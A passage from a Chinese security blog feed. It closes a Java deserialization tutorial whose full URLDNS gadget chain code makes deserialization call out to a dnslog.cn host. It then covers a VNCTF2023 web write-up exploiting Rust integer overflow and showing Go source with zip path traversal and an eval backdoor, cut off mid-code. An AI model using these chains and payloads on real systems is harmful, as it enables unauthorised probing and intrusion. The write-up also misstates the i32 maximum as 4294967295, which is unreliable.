class><p>最终会在URLStreamHandler类调用getHostAddress函数发起域名解析请求。所以这条链就只有两部分HashMap-&gt;URL。那么编写攻击链，我们的预期是只有在反序列化的时候才会发起DNS请求来验证反序列化漏洞，</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test05</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;web.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">        System.out.println(<span class="string">&quot;1.序列化成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt;hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://u4lht2.dnslog.cn&quot;</span>);</span><br><span class="line">        hashMap.put(url,<span class="number">1</span>);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由上述代码，在序列化的时候也会收到DNS请求。</p><img src="/2023/02/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/10.png" class><p>为什么会这样？跟进put方法看一下，</p><img src="/2023/02/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/11.png" class><p>为了确保键的唯一性，它会去计算key的hash值，跟进hash方法，</p><img src="/2023/02/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/12.png" class><p>它最后也会调用hashCode方法。所以在put的时候它就发起了一个DNS请求，另外，在我们分析攻击链的时候，如果hashCode的值不等于-1，就会返回hashCode，而不会去调用handler.hashCode。它在初始化的时候为-1。</p><img src="/2023/02/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/13.png" class><p>接下来调用put函数的时候，hashCode就变成了key的哈希值。也就是说，在反序列化的时候并不会发起DNS请求，这就是一个无效链，所以我们需要调整一下代码。</p><p>怎么去改变呢？我们的目的就是在put的时候不让它发起一个DNS请求，同时还需要修改hashCode值为-1。可以通过反射来改变已有对象的属性。第一步，在put函数之前更改hashCode为不是-1的值：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">hashcodefiled</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">hashcodefiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">hashcodefiled.set(url,<span class="number">1234</span>);</span><br></pre></td></tr></table></figure><p>然后在put函数之后把hashCode改回来，让它在反序列化的时候发起一个DNS请求：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">hashcodefiled.set(url,-<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>最后完整代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test03</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;web.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">        System.out.println(<span class="string">&quot;1.序列化成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;2.反序列化成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt;hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://t9jge4.dnslog.cn&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcodefiled</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashcodefiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashcodefiled.set(url,<span class="number">1234</span>);</span><br><span class="line">        hashMap.put(url,<span class="number">1</span>);</span><br><span class="line">        hashcodefiled.set(url,-<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//serialize(hashMap);</span></span><br><span class="line">        unserialize(<span class="string">&quot;web.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>序列化的时候没有发起DNS请求，而在反序列化的时候接收到请求了。</p><img src="/2023/02/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/14.png" class><p>重温一下思路：</p><blockquote><p>我们的入口类是HashMap，在反序列化的时候，它会调用重写的readObject方法，而在该方法里，它会计算第一个参数，也就是key的hash值，进而调用hash函数，进而调用key的hashCode函数。而我们的目标方法就是URL原生类的hashCode方法，满足调用链的同名同类型，让key传入URL对象，即为完整的攻击链。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap.readObject()-&gt;hash()-&gt;key.hashCode()-&gt;URL.hashCode-&gt;handler.hashCode()-&gt;getHostAddress()</span><br></pre></td></tr></table></figure><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>java反序列化之路任重而道远。</p><h2 id="相关链接："><a href="#相关链接：" class="headerlink" title="相关链接："></a>相关链接：</h2><p><a href="https://www.bilibili.com/video/BV16h411z7o9/?p=2&spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=f071e738f9dfd2c0aaef0c96b89916ba">b站反序列化基础</a></p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF2023web复现</title>
      <link href="/2023/02/19/VNCTF2023web%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/02/19/VNCTF2023web%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>近期参加了VNCTF2023，里面有两道web题是考察rust和go语言的，由于这两门语言之前从未接触过，比赛结束后借着师傅的wp复现一波，在此写文章记录一下。网上一位师傅的wp：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.cnblogs.com/nLesxw/p/VNCTF2023.html</span><br></pre></td></tr></table></figure><p>根据此wp进行复现。</p><h2 id="象棋王子"><a href="#象棋王子" class="headerlink" title="象棋王子"></a>象棋王子</h2><p>打开题目，前端象棋小游戏。</p><img src="/2023/02/19/VNCTF2023web%E5%A4%8D%E7%8E%B0/1.png" class><p>找js文件审计代码了解逻辑，在play.js中发现jsfuck编码，一看就是flag，直接放在游览器上运行出flag。</p><img src="/2023/02/19/VNCTF2023web%E5%A4%8D%E7%8E%B0/2.png" class><h2 id="电子木鱼"><a href="#电子木鱼" class="headerlink" title="电子木鱼"></a>电子木鱼</h2><p>给了附件，Rust语言做后端。Rust语言之前从来没接触过，比赛时边查文档边审。主要说一下几个路由，</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="meta">#[derive(Deserialize)]</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Info</span> &#123;</span><br><span class="line">    name: <span class="type">String</span>,</span><br><span class="line">    quantity: <span class="type">i32</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#[derive(Debug, Copy, Clone, Serialize)]</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Payload</span> &#123;</span><br><span class="line">    name: &amp;<span class="symbol">&#x27;static</span> <span class="type">str</span>,</span><br><span class="line">    cost: <span class="type">i32</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> PAYLOADS: &amp;[Payload] = &amp;[</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: <span class="string">&quot;Cost&quot;</span>,</span><br><span class="line">        cost: <span class="number">10</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: <span class="string">&quot;Loan&quot;</span>,</span><br><span class="line">        cost: -<span class="number">1_000</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: <span class="string">&quot;CCCCCost&quot;</span>,</span><br><span class="line">        cost: <span class="number">500</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: <span class="string">&quot;Donate&quot;</span>,</span><br><span class="line">        cost: <span class="number">1</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: <span class="string">&quot;Sleep&quot;</span>,</span><br><span class="line">        cost: <span class="number">0</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>不同的name对应所要扣除或者增加的功德。</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="meta">#[get(<span class="string">&quot;/&quot;</span>)]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">index</span>(tera: web::Data&lt;Tera&gt;) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;HttpResponse, Error&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">context</span> = Context::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    context.<span class="title function_ invoke__">insert</span>(<span class="string">&quot;gongde&quot;</span>, &amp;GONGDE.<span class="title function_ invoke__">get</span>());</span><br><span class="line">    <span class="keyword">if</span> GONGDE.<span class="title function_ invoke__">get</span>() &gt; <span class="number">1_000_000_000</span> &#123;</span><br><span class="line">        context.<span class="title function_ invoke__">insert</span>(</span><br><span class="line">            <span class="string">&quot;flag&quot;</span>,</span><br><span class="line">            &amp;std::env::<span class="title function_ invoke__">var</span>(<span class="string">&quot;FLAG&quot;</span>).<span class="title function_ invoke__">unwrap_or_else</span>(|_| <span class="string">&quot;flag&#123;test_flag&#125;&quot;</span>.<span class="title function_ invoke__">to_string</span>()),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">match</span> tera.<span class="title function_ invoke__">render</span>(<span class="string">&quot;index.html&quot;</span>, &amp;context) &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(body) =&gt; <span class="title function_ invoke__">Ok</span>(HttpResponse::<span class="title function_ invoke__">Ok</span>().<span class="title function_ invoke__">body</span>(body)),</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(err) =&gt; <span class="title function_ invoke__">Err</span>(error::<span class="title function_ invoke__">ErrorInternalServerError</span>(err)),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义GONGDE.get()为对应佛祖的功德，如果功德大于十亿，它就会给你flag。</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="meta">#[get(<span class="string">&quot;/reset&quot;</span>)]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">reset</span>() <span class="punctuation">-&gt;</span> Json&lt;APIResult&gt; &#123;</span><br><span class="line">    GONGDE.<span class="title function_ invoke__">set</span>(<span class="number">0</span>);</span><br><span class="line">    web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">        success: <span class="literal">true</span>,</span><br><span class="line">        message: <span class="string">&quot;重开成功，继续挑战佛祖吧&quot;</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>清空所有路由，重点代码如下：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="meta">#[post(<span class="string">&quot;/upgrade&quot;</span>)]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">upgrade</span>(body: web::Form&lt;Info&gt;) <span class="punctuation">-&gt;</span> Json&lt;APIResult&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> GONGDE.<span class="title function_ invoke__">get</span>() &lt; <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">            success: <span class="literal">false</span>,</span><br><span class="line">            message: <span class="string">&quot;功德都搞成负数了，佛祖对你很失望&quot;</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> body.quantity &lt;= <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">            success: <span class="literal">false</span>,</span><br><span class="line">            message: <span class="string">&quot;佛祖面前都敢作弊，真不怕遭报应啊&quot;</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Some</span>(payload) = PAYLOADS.<span class="title function_ invoke__">iter</span>().<span class="title function_ invoke__">find</span>(|u| u.name == body.name) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">cost</span> = payload.cost;</span><br><span class="line">        <span class="keyword">if</span> payload.name == <span class="string">&quot;Donate&quot;</span> || payload.name == <span class="string">&quot;Cost&quot;</span> &#123;</span><br><span class="line">            cost *= body.quantity;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> GONGDE.<span class="title function_ invoke__">get</span>() &lt; cost <span class="keyword">as</span> <span class="type">i32</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">                success: <span class="literal">false</span>,</span><br><span class="line">                message: <span class="string">&quot;功德不足&quot;</span>,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> cost != <span class="number">0</span> &#123;</span><br><span class="line">            GONGDE.<span class="title function_ invoke__">set</span>(GONGDE.<span class="title function_ invoke__">get</span>() - cost <span class="keyword">as</span> <span class="type">i32</span>);</span><br><span class="line">        &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>在此路由下，功德不能为负数，并且我们post上传的quantity参数不能小于0。起初我想利用Loan对应的cost一点点往上加功德直至十亿。这就要发包十万次，我写的python脚本很快就429了。这就是出题人留下的一个坑，由于对rust语言不了解，到比赛结束也没找到方法。最后看了那位师傅写的wp，有这么一个介绍rust语言特性的链接：<a href="https://course.rs/basic/base-type/numbers.html">Rust语言圣经</a></p><p>其中提到了Rust语言的整形溢出：</p><img src="/2023/02/19/VNCTF2023web%E5%A4%8D%E7%8E%B0/3.png" class><p>很明显本题是用补码循环溢出来解决整形溢出的这个问题，举个例子，对于一个i8的类型变量（整数范围在0~127）如果我们将其值加1，并得到了结果128，那么该值就会被映射回-128，从而形成了一个循环。类似地，如果我们将其值减1，并得到了结果-129，那么该值就会被映射回127，从而形成了另一个循环。本题漏洞代码：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">cost *= body.quantity;</span><br></pre></td></tr></table></figure><p>这个累乘操作使得整形溢出成为可能。我们使name&#x3D;Cost，则可以让quantity变量扩大十倍，造成整形溢出。Rust语言通过补码循环溢出可将该值映射到绝对值比十亿要大的负数了，这样也能成功绕过佛祖的作弊检测。那该让quantity赋值多少呢？不能太大也不能太小，i32的变量最大值为4294967295，在此赋值为25亿，发包后确实能够加功德。</p><img src="/2023/02/19/VNCTF2023web%E5%A4%8D%E7%8E%B0/4.png" class><p>刷新根路由，成功达到功德无量，佛祖给你flag。</p><img src="/2023/02/19/VNCTF2023web%E5%A4%8D%E7%8E%B0/5.png" class><h2 id="BabyGo"><a href="#BabyGo" class="headerlink" title="BabyGo"></a>BabyGo</h2><p>这道题相关考点：</p><blockquote><p>1.go语言代码审计</p><p>2.filepath.Clean函数目录穿越漏洞</p><p>3.go的函数沙箱逃逸</p></blockquote><p>go语言做后端，题目源码：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;encoding/gob&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/PaulXu-cn/goeval&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/duke-git/lancet/cryptor&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/duke-git/lancet/fileutil&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/duke-git/lancet/random&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-contrib/sessions&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-contrib/sessions/cookie&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;path/filepath&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;  #定义一个User结构体</span><br><span class="line">Name  <span class="type">string</span></span><br><span class="line">Path  <span class="type">string</span></span><br><span class="line">Power <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()  #创建Gin框架实例</span><br><span class="line">store := cookie.NewStore(random.RandBytes(<span class="number">16</span>))#随机cookie</span><br><span class="line">r.Use(sessions.Sessions(<span class="string">&quot;session&quot;</span>, store))</span><br><span class="line">r.LoadHTMLGlob(<span class="string">&quot;template/*&quot;</span>)#加载模板</span><br><span class="line">r.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">userDir := <span class="string">&quot;/tmp/&quot;</span> + cryptor.Md5String(c.ClientIP()+<span class="string">&quot;VNCTF2023GoGoGo~&quot;</span>) + <span class="string">&quot;/&quot;</span></span><br><span class="line">session := sessions.Default(c)</span><br><span class="line">session.Set(<span class="string">&quot;shallow&quot;</span>, userDir) </span><br><span class="line">session.Save()</span><br><span class="line">fileutil.CreateDir(userDir)#创建目录</span><br><span class="line">gobFile, _ := os.Create(userDir + <span class="string">&quot;user.gob&quot;</span>)#创建文件</span><br><span class="line">user := User&#123;Name: <span class="string">&quot;ctfer&quot;</span>, Path: userDir, Power: <span class="string">&quot;low&quot;</span>&#125;</span><br><span class="line">encoder := gob.NewEncoder(gobFile)</span><br><span class="line">encoder.Encode(user)</span><br><span class="line"><span class="keyword">if</span> fileutil.IsExist(userDir) &amp;&amp; fileutil.IsExist(userDir+<span class="string">&quot;user.gob&quot;</span>) &#123;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;index.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Your path: &quot;</span> + userDir&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.HTML(<span class="number">500</span>, <span class="string">&quot;index.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to make user dir&quot;</span>&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">r.GET(<span class="string">&quot;/upload&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;upload me!&quot;</span>&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">r.POST(<span class="string">&quot;/upload&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session := sessions.Default(c)</span><br><span class="line"><span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;#不能为<span class="literal">nil</span></span><br><span class="line">c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">userUploadDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>) + <span class="string">&quot;uploads/&quot;</span></span><br><span class="line">fileutil.CreateDir(userUploadDir)#创建目录</span><br><span class="line">file, err := c.FormFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;no file upload&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">ext := file.Filename[strings.LastIndex(file.Filename, <span class="string">&quot;.&quot;</span>):]</span><br><span class="line"><span class="keyword">if</span> ext == <span class="string">&quot;.gob&quot;</span> || ext == <span class="string">&quot;.go&quot;</span> &#123;</span><br><span class="line">c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Hacker!&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;#不能上传gob和<span class="keyword">go</span></span><br><span class="line">filename := userUploadDir + file.Filename</span><br><span class="line"><span class="keyword">if</span> fileutil.IsExist(filename) &#123;</span><br><span class="line">fileutil.RemoveFile(filename)#如果存在删除</span><br><span class="line">&#125;</span><br><span class="line">err = c.SaveUploadedFile(file, filename)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to save file&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;file saved to &quot;</span> + filename&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">r.GET(<span class="string">&quot;/unzip&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session := sessions.Default(c)</span><br><span class="line"><span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">userUploadDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>) + <span class="string">&quot;uploads/&quot;</span></span><br><span class="line">files, _ := fileutil.ListFileNames(userUploadDir)#获得文件后缀</span><br><span class="line">destPath := filepath.Clean(userUploadDir + c.Query(<span class="string">&quot;path&quot;</span>))</span><br><span class="line"><span class="keyword">for</span> _, file := <span class="keyword">range</span> files &#123;</span><br><span class="line"><span class="keyword">if</span> fileutil.MiMeType(userUploadDir+file) == <span class="string">&quot;application/zip&quot;</span> &#123;</span><br><span class="line">err := fileutil.UnZip(userUploadDir+file, destPath)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;zip.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to unzip file&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fileutil.RemoveFile(userUploadDir + file)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;zip.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;success unzip&quot;</span>&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">r.GET(<span class="string">&quot;/backdoor&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session := sessions.Default(c)</span><br><span class="line"><span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">userDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>)</span><br><span class="line"><span class="keyword">if</span> fileutil.IsExist(userDir + <span class="string">&quot;user.gob&quot;</span>) &#123;</span><br><span class="line">file, _ := os.Open(userDir + <span class="string">&quot;user.gob&quot;</span>)</span><br><span class="line">decoder := gob.NewDecoder(file)</span><br><span class="line"><span class="keyword">var</span> ctfer User</span><br><span class="line">decoder.Decode(&amp;ctfer)</span><br><span class="line"><span class="keyword">if</span> ctfer.Power == <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">eval, err := goeval.Eval(<span class="string">&quot;&quot;</span>, <span class="string">&quot;fmt.Println(\&quot;Good\&quot;)&quot;</span>, c.DefaultQuery(<span class="string">&quot;pkg&quot;</span>, <span class="string">&quot;fmt&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line">&#125;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="type">string</span>(eval)&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;low power&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">c.HTML(<span class="number">500</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;no such user gob&quot;</span>&#125;)</span><br><span class="line"><span 